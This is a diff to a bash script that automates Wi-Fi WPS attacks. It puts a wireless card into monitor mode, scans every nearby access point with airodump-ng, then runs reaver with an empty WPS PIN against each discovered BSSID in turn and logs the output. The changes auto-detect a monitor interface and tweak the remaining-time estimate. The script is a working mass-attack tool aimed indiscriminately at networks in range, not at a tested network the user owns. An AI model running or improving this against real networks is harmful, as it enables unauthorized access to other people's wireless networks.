@@ -14,9 +14,22 @@ read -p "Press enter to continue"
 
 clear
 
-echo Input your wireless card
+mon=$(iwconfig 2>&1 | grep Monitor | cut -d ' ' -f 1)
 
-read card
+if [[ $mon == "" ]]; then
+
+	iwconfig
+	echo Input your wireless card
+
+	read card
+
+	cardmon=$(airmon-ng start $card | grep on -w | cut -d ' ' -f 9 | cut -d ] -f 2 | cut -d \) -f 1)
+
+else 
+
+	cardmon=$(echo $mon)
+
+fi
 
 echo For how long should I scan APs ? \(seconds\)
 
@@ -26,11 +39,9 @@ echo Time to spend for each AP ? \(seconds, recommended is 20 or less\)
 
 read cracktime
 
-sudo airmon-ng start $card
-
 clear
 
-xterm -e timeout $scantime airodump-ng ${card}mon -w airodump
+xterm -e timeout $scantime airodump-ng $cardmon -w airodump
 
 rm airodump-01.cap
 
@@ -74,13 +85,13 @@ for ligne in `seq 1 $nbrlignes`;
 
 do
 	
-	echo $ligne out of $nbrlignes. Estimated remaining time : $(($cracktime*($nbrlignes-$ligne)/60)) minutes
+	echo $ligne out of $nbrlignes. Estimated remaining time : $((($cracktime*($nbrlignes-$ligne)/60)+1)) minutes
 
 	bssid=$(head -$ligne bssid.txt | tail -1)
 
 	channel=$(head -$ligne channels.txt | tail -1)
 
-	timeout $cracktime sudo reaver -i ${card}mon -b $bssid -p "" -vv -c $channel >> output.txt
+	timeout $cracktime sudo reaver -i $cardmon -b $bssid -p "" -vv -c $channel >> output.txt
 
 done
 
